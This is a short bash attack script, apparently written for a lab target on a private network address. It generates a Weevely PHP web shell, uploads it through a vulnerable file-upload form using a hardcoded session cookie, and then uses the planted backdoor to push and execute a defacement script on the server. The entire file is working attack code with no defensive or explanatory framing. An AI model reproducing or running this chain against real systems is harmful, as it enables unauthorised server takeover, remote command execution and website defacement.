URL="http://192.168.0.13"
TARGET="$URL/upload.php"
WEEVELY_PATH="/home/debian-attacker/weevely3-master/weevely.py"


echo "Generating weevely backdoor named hello.php with password foo..."
$WEEVELY_PATH generate foo hello.php
echo "Payload done."



echo "Uploading backdoor..."

result=$(curl --location --request POST $TARGET \
--header 'Cookie: PHPSESSID=dnbsv2ol6um1huo11a1v46n9u5' \
--form 'uploadedFile=@hello.php' \
--form 'uploadBtn=Upload')

echo $result
if [[ $result == *"File was successfully uploaded"* ]]; then
  echo "upload OK."
  uploadedfile=$(echo $result | egrep -o 'File was successfully uploaded to .+.php' | cut -d "/" -f5)
  #payload=$(cat defacing.sh)
  $WEEVELY_PATH $URL/uploaded_files/$uploadedfile foo "file_upload defacing.sh script.sh"
  $WEEVELY_PATH $URL/uploaded_files/$uploadedfile foo "bash script.sh"
  #$WEEVELY_PATH $URL/uploaded_files/$uploadedfile foo

else
  echo "Couldn't upload file to web target."
fi
